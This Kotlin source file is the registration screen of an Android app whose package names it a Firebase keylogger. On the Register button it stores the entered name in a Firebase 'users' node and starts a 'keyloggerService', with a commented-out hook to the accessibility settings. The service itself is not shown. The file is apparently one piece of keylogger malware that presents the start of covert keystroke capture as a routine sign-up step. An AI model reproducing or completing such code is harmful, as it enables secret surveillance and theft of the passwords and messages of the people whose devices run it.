package com.sm.sdt.firebasekeyloggerandroird.ui.Fragment

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.sm.sdt.firebasekeyloggerandroird.R
import com.sm.sdt.firebasekeyloggerandroird.databinding.FragmentRegistationBinding
import com.sm.sdt.firebasekeyloggerandroird.keyloggerService

class RegistationFragment : Fragment(R.layout.fragment_registation) {

    private var _binding: FragmentRegistationBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentRegistationBinding.inflate(inflater, container, false)
        val view = binding.root
        return view
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        activity?.setTitle("Registration")
        val firebaseAuth = FirebaseAuth.getInstance()
        val firebaseDatabase = FirebaseDatabase.getInstance()
        val nameText = binding.name
        val userRef = firebaseDatabase.getReference("users")
        val registrationBtn = binding.registerBtn


        binding.loginTv.setOnClickListener {
            findNavController().navigate(RegistationFragmentDirections.actionRegistationFragmentToLoginFragment())
        }

        registrationBtn.setOnClickListener {
            if (nameText.text.isNullOrEmpty()) {
                Toast.makeText(activity, "Please enter a name", Toast.LENGTH_SHORT).show()
            } else {
                userRef.push().child(nameText.text.toString()).child("Account data").child("name")
                    .setValue(nameText.text.toString())
            }

            val intent = Intent(requireContext(), keyloggerService::class.java)
//            val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
//            intent.putExtra("name", nameText.text.toString())
            requireActivity().startService(intent)

        }

    }

}